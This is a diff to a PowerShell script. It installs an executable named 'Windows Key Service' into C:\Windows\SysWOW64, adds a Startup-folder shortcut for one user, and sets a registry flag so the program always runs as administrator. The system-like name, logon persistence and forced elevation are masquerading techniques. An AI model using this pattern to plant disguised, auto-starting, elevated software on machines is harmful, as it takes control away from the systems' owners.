@@ -1,9 +1,11 @@
 $BaseDir = "Z:\"
-$App = "Windows Key Service.exe"
+$App = "Windows Key Service"
+$AppExe = "$App.exe"
 $DestDir = "C:\Windows\SysWOW64\"
 $DestIp = "***REMOVED***"
-$InstallPath = "$DestDir$App"
-$ShortcutDir = "C:\Users\Mark\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\service.lnk"
+$InstallPath = "$DestDir$AppExe"
+$ShortcutPath = "C:\Users\Mark\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\service.lnk"
+$AppCompatFlagsLayers = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
 
 $Machine = [Environment]::MachineName
 $LogDate = Get-Date -Format "ddMMyyyy-HHmm"
@@ -22,20 +24,23 @@ function Install()
     {
         try {
             # Install
-            Copy-Item -Path "$BaseDir$App" -Destination $DestDir -ErrorAction Stop 2>&1 >> $LogFile
+            Copy-Item -Path "$BaseDir$AppExe" -Destination $DestDir -ErrorAction Stop 2>&1 >> $LogFile
             
             # Create shortcut
             $objShell = New-Object -ComObject ("WScript.Shell")
-            $objShortCut = $objShell.CreateShortcut($ShortcutDir)
+            $objShortCut = $objShell.CreateShortcut($ShortcutPath)
             $objShortCut.TargetPath = $InstallPath
             $objShortCut.Save()
+            "Created shortcut at $ShortcutPath" | Out-File -Append -FilePath $LogFile
 
+            # Always run application as admin
+            New-ItemProperty -Path $AppCompatFlagsLayers -Name $InstallPath -Value "RUNASADMIN" -PropertyType String -Force | Out-File -Append -FilePath $LogFile
+            
             # Start application
-            Start-Process -FilePath $InstallPath
+            Start-Process -FilePath $InstallPath | Out-File -Append -FilePath $LogFile
         } catch {
             $_.Exception.Message | Out-File -Append -FilePath $LogFile
         }
-
     }
     else
     {
@@ -45,8 +50,10 @@ function Install()
 
 function Uninstall()
 {
+    Stop-Process -Name $App -Force
     Remove-Item $InstallPath | Out-File -Append -FilePath $LogFile
-    Remove-Item $ShortcutDir | Out-File -Append -FilePath $LogFile
+    Remove-Item $ShortcutPath | Out-File -Append -FilePath $LogFile
+    Remove-ItemProperty -Path $AppCompatFlagsLayers -Name $InstallPath -Force | Out-File -Append -FilePath $LogFile
     "Uninstalled $InstallPath" | Out-File -Append -FilePath $LogFile
 }
 
